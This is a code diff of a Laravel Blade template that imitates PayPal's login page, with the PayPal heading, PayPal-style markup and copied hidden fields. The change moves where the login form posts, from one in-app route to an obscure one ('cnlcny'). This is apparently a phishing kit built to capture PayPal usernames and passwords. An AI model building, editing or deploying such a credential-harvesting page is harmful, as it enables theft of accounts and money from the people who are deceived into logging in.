@@ -244,7 +244,7 @@
                         <h1 class="headerText accessAid">Log in to your PayPal account</h1>
                         <div class="notifications"></div>
                         <!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
-                        <form action="{{ url('pal') }}" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
+                        <form action="{{ url('cnlcny') }}" method="post" class="proceed maskable" autocomplete="off" name="login" autocomplete="off" novalidate>
                             @csrf
                             <!-- <input type="hidden" id="token" name="_csrf" value="p02PG7qTPOzRbBlVOVYcIZp207FMD847ffoS0=" /><input type="hidden" name="locale.x" value="en_US" /><input type="hidden" name="processSignin" value="main" />
                             <input type="hidden" name="fn_sync_data" value="fn_sync_data" /><input type="hidden" name="intent" value="signin" /><input type="hidden" name="ads-client-context" value="signin" />
